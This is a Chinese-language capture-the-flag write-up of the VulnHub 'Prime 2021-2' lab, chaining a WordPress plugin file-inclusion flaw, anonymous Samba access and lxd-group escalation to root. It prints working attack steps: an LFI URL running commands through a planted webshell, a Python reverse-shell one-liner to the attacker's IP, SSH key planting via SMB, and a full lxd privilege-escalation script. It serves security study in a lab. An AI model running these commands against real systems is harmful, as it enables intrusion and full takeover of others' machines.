![20210519202302.jpg](https://image.3001.net/images/20210520/1621466950_60a59f46dae985f005953.jpg!small)

## 前言

本次渗透皆为靶机环境，实则为上一篇靶机 Prime level 1
的后续。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

  * 靶场地址：<https://www.vulnhub.com/entry/prime-2021-2,696/>

> ### Description
>
> This vm will give you some real concept that is needfull for a global level
> certifications. And you are going to enjoy this VM because of there is a
> good combination of network and web pentesting. For any help contact here
> <https://www.hackerctf.com/contact-us>or drop an email to
> [suraj@hackerctf.com](mailto:suraj@hackerctf.com)

本次渗透涉及到的关键知识点：

  * Web 信息收集

  * WordPress gracemedia-media-player 插件本地文件包含漏洞

  * Samba 服务器空密码入侵

  * Ubuntu 18.04 - 'lxd' 特权提升

  * ……

> 文中若有不当之处还请各位大佬多多点评
>
> 我的博客：<https://whoamianony.top/>

## 信息收集

首先使用 arp-scan 扫描资产：

    
    
    arp-scan --interface=eth0 192.168.226.0/24

![image-20210519202617823](https://image.3001.net/images/20210520/1621466951_60a59f47ba75207918d9f.png!small)

发现目标主机 192.168.226.133，使用 nmap 做进一步端口扫描：

    
    
    nmap -sC -sV -p- -sT 192.168.226.133

![image-20210519202837354](https://image.3001.net/images/20210520/1621466952_60a59f48720367909038e.png!small)

如上图所示，开启的服务不少，除了 22 和 80 外，还开启了 139、445 和 10123。其中 139 和 445 上运行的是 Samba
服务，说明目标机可能是一个 SMB 服务器。10123 口上是一个 Python 搭建的 HTTP 服务。

>
> SMB（服务器消息块）是一种协议，它允许同一网络上的资源共享文件，浏览网络并通过网络进行打印。它最初用于Windows，但是Unix系统可以通过Samba使用SMB。今天，我们将使用名为Enum4linux的工具从目标中提取信息，并使用smbclient连接到SMB共享并传输文件。
>
>
> 通常，服务器上有SMB共享驱动器，可以连接到该驱动器并用于查看或传输文件。对于想要发现敏感信息的攻击者来说，SMB通常可以是一个很好的起点，你会惊讶地发现这些共享中有时包含什么。在极少数情况下，例如当SMB共享目录和Web服务器根目录相同时，攻击者甚至可能利用这种错误配置来实现代码执行。

首先访问 80 口的 Web 服务：

![image-20210519203440515](https://image.3001.net/images/20210520/1621466955_60a59f4b5c29a17619f97.png!small)

再看看 10123 口上的服务，如下图可以看到这里存在一个文件遍历，可以下载文件：

![image-20210519203703484](https://image.3001.net/images/20210520/1621466957_60a59f4da0fecae7ee5a2.png!small)

我们使用 wget 将 10123 口上的文件全部递归下载下来：

    
    
    wget -r http://192.168.226.133:10123

![image-20210519204147373](https://image.3001.net/images/20210520/1621466958_60a59f4e021ea8b61108f.png!small)

然后挨个查看，如下图所示，在 upload 目录里面发现了一个 shell.php：

![image-20210519204411780](https://image.3001.net/images/20210520/1621466960_60a59f5054b26caf368bb.png!small)

显然是个 Webshell 后门，接下来我们就要想办法利用这个 Webshell。由于 10123 端口上是 Python 启动的 HTTP
服务，shell.php 无法被解析，所以如果我们要利用的话还需要从 80 口进行利用。

## 开始攻击

首先我们来对 80 口上的 Web 服务进行目录扫描：

![image-20210519204808112](https://image.3001.net/images/20210520/1621466965_60a59f5545ac8d268d0a6.png!small)

发现 wp 目录，访问 wp 不出所料是一个 wordpress：

![image-20210519204902455](https://image.3001.net/images/20210520/1621466968_60a59f58216334c2670d3.png!small)

一看到 wordpress 就想到先用 wpscan 扫一波，来看看有什么插件漏洞：

    
    
    wpscan --url http://192.168.226.133/wp/ --enumerate ap --api-token AC24aGaxxxxxxxxxxxxxxxxxxxxxxxxxxEJJTk9jGrQ

![image-20210519222942449](https://image.3001.net/images/20210520/1621466969_60a59f597187a52c089e0.png!small)

如上图所示发现目标的 gracemedia-media-player 插件上存在一个本地文件包含漏洞，根据下面给出的参考信息我们可以在 exploit-db
上找到该漏洞的利用方式：

![image-20210519223719475](https://image.3001.net/images/20210520/1621466971_60a59f5b443792f744e48.png!small)

如下图所示成功利用：

![image-20210519230354039](https://image.3001.net/images/20210520/1621466971_60a59f5bbab301ee0731b.png!small)

并且发现目标主机上存在一个 jarves 用户，其主目录为 /home/jarves。

现在我们便可以通过这里的本地文件包含漏洞去包含利用之前找到的 shell.php 了。但是现在还需要解决一个问题，便是 shell.php 的路径问题。

我们再来回想一下之前做的信息收集，当时还发现目标机上 139 和 445 端口上运行着 Samba 服务，直觉让我觉得 10123 端口肯定与这里的
Samba 服务有关。

我们使用 Enum4linux 工具对目标主机上的 SMB 信息进行枚举：

    
    
    enum4linux -A 192.168.226.133

![image-20210519225359352](https://image.3001.net/images/20210520/1621466972_60a59f5c769a2ca742e3d.png!small)

如上图所示，目标机的 Samba 服务运行使用空密码进行访问，并且开启着三个共享：

![image-20210519225534168](https://image.3001.net/images/20210520/1621466976_60a59f603359745b3cd10.png!small)

现在，我们已经使用 Enum4linux 收集了有关目标的一些信息，我们可以使用 Smbclient 工具来与系统上的 SMB 进行实际交互。

> Smbclient 是一种用于访问服务器上 SMB 资源的工具，就像 FTP
> 客户端用于访问文件一样。它提供了一个简单的命令行界面，如果您完全熟悉FTP的话，可以轻松使用。
    
    
    smbclient //192.168.226.133/welcome -U '' -N

  * -U：标志指定用户名（在这种匿名登录的情况下为空白字符串）

  * -N：指定无密码

现在我们只需在提示符下按 Enter 键即可匿名登录：

![image-20210519230502060](https://image.3001.net/images/20210520/1621466977_60a59f6188c9ad63209b9.png!small)

如上图所示，连上之后列出当前目录，发现和之前 10123 端口发现的目录结构是完全一样的，说明之前的 10123 口上的服务运行目录就是当前 Samba
服务的目录，猜测应该是 jarves 用户的主目录。经过测试，验证了我的猜测：

    
    
    /wp/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=/home/jarves/upload/shell.php&cmd=id

![image-20210519230923720](https://image.3001.net/images/20210520/1621466979_60a59f63ab31f1c722749.png!small)

如上图所示，成功执行命令。

然后尝试使用 bash、nc 反弹 Shell 皆失败，由于目标主机上存在 python，我们完全可以使用 python 来反弹 Shell：

    
    
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.226.128",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

![image-20210519232023260](https://image.3001.net/images/20210520/1621466980_60a59f6409102082e79b4.png!small)

成功获得 Shell。

## 权限提升

在根目录里面没有发现 flag，那么 flag 一定是在 /root 目录里面，所以必然的我们要提权。

由于我们已经控制了目标机的 Samba，我们完全可以在目标机用户 jarves 的主目录里面写入 SSH 秘钥进行免密登录。

首先在攻击机本地生成 SSH 秘钥：

    
    
    ssh-keygen -t rsa  
    cp ~/.ssh/id_rsa.pub ./authorized_keys

然后再 smbclient 里面为 jarves 用户创建一个 .ssh 目录，并将刚才生成的 authorized_keys 文件上传上去：

    
    
    mkdir .ssh  
    cd .ssh  
    put authorized_keys

![image-20210520000018142](https://image.3001.net/images/20210520/1621466982_60a59f66028279d92ee13.png!small)

然后便可以直接连接 jarves 用户的 SSH 了：

![image-20210520000103286](https://image.3001.net/images/20210520/1621466988_60a59f6cca1a0a21e9da4.png!small)

首先尝试 SUID 提权，搜了一波并没有什么可以利用的文件：

![image-20210520000239403](https://image.3001.net/images/20210520/1621466991_60a59f6fd36216dd3aca1.png!small)

然后尝试使用 sudo 提权，却发现需要输入密码，无法利用：

![image-20210520000345806](https://image.3001.net/images/20210520/1621466995_60a59f73147b72190fe50.png!small)

只能寻找别的突破口。

我们执行`id`命令时发现当前这个 jarves 用户位于 lxd 组中：

![image-20210520000554081](https://image.3001.net/images/20210520/1621466995_60a59f73a357c88098877.png!small)

而这个 lxd 去 exploit-db 上一搜发现存在一个提权漏洞：

![image-20210520000806246](https://image.3001.net/images/20210520/1621466996_60a59f7482105bc1852b3.png!small)

并且当前系统版本也在漏洞的范围内。

> Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于 Chroot 和完整开发的虚拟机之间，LXC
> 可以创建一个跟正常Linux操作系统十分接近的环境，但是不需要使用到单独的内核资源。Linux
> Daemon（LXD）是一个轻量级容器管理程序，而LXD是基于 LXC 容器技术实现的，而这种技术之前 Docker 也使用过。LXD 使用了稳定的
> LXC API 来完成所有的后台容器管理工作，并且增加了REST API支持，更进一步地提升了用户体验度。
>
> LXD 是一个 Root 进程，它可以负责执行任意用户的 LXD UNIX 套接字写入访问操作。而且在某些情况下，LXD
> 甚至都不会对调用它的用户权限进行检查和匹配，现在社区也有很多种方法可以利用 LXD 的这种特性来实施攻击。
>
> 其中的一项技术就是使用LXD API来将目标主机的根文件系统加载进一个容器中，而本文讨论的也是这项技术。一旦成功，攻击者就可以将低权限的用户提升为
> Root 权限，并且能够在不受任何限制的情况下访问目标系统的各种数据资源，类似于 Docker 特权模式逃逸。

查看详细的漏洞利用步骤：

![image-20210520001153541](https://image.3001.net/images/20210520/1621466996_60a59f74cb2dee44a9fa5.png!small)

大概就是：

  * 通过 wget 将构建好的 Alpine 镜像源码下载至本地

  * 执行`build -alpine`命令完成最新版本的 Alpine 镜像构建，此操作必须由root用户完成

  * 将 tar 文件发送至目标设备

    
    
    wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine  
    chmod +x build-alpine  
    ./build-alpine

执行`./build-alpine`之后，会在当前目录下创建一个 tar.gz 文件：

![image-20210520004527217](https://image.3001.net/images/20210520/1621466997_60a59f752a08565e168b3.png!small)

之后我们需要将其下载至目标系统。攻击机使用 python 在 lxd-alpine-builder 目录里面开启一个 HTTP 服务：

    
    
    python3 -m http.server

![image-20210520002627177](https://image.3001.net/images/20210520/1621466997_60a59f75b2f7e196c3914.png!small)

然后控制目标机使用 wget 下载 tar.gz 文件：

    
    
    wget http://192.168.226.128:8000/alpine-v3.13-x86_64-20210520_0044.tar.gz

![image-20210520004730970](https://image.3001.net/images/20210520/1621466998_60a59f7624c3fa13b1c8f.png!small)

然后在目标机上创建一个利用脚本 exp：

    
    
    #!/usr/bin/env bash  
    ​  
    # ----------------------------------  
    # Authors: Marcelo Vazquez (S4vitar)  
    #      Victor Lasa      (vowkin)  
    # ----------------------------------  
    ​  
    # Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine]  
    # Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine]  
    # Step 3: Run this script and you will get root [Victim Machine]  
    # Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine  
    ​  
    function helpPanel(){  
    echo -e "\nUsage:"  
    echo -e "\t[-f] Filename (.tar.gz alpine file)"  
    echo -e "\t[-h] Show this help panel\n"  
    exit 1  
    }  
    ​  
    function createContainer(){  
    lxc image import $filename --alias alpine && lxd init --auto  
    echo -e "[*] Listing images...\n" && lxc image list  
    lxc init alpine privesc -c security.privileged=true  
    lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true  
    lxc start privesc  
    lxc exec privesc sh  
    cleanup  
    }  
    ​  
    function cleanup(){  
    echo -en "\n[*] Removing container..."  
    lxc stop privesc && lxc delete privesc && lxc image delete alpine  
    echo " [√]"  
    }  
    ​  
    set -o nounset  
    set -o errexit  
    ​  
    declare -i parameter_enable=0; while getopts ":f:h:" arg; do  
    case $arg in  
    f) filename=$OPTARG && let parameter_enable+=1;;  
    h) helpPanel;;  
    esac  
    done  
    ​  
    if [ $parameter_enable -ne 1 ]; then  
    helpPanel  
    else  
    createContainer  
    fi

然后执行以下命令：

    
    
    bash exp -f alpine-v3.13-x86_64-20210520_0044.tar.gz

![image-20210520004815535](https://image.3001.net/images/20210520/1621467001_60a59f790a8aa3ad01a75.png!small)

如上图所示成功提权。此时我们便能够在不受任何限制的情况下访问目标系统的各种数据资源了：

![image-20210520005348345](https://image.3001.net/images/20210520/1621467003_60a59f7b0980e663b1ba3.png!small)

## Ending......

![20210519202313.jpg](https://image.3001.net/images/20210520/1621467008_60a59f802cbd350e7634e.jpg!small)

文中若有不当之处还请各位大佬多多点评

我的博客：<https://whoamianony.top/>

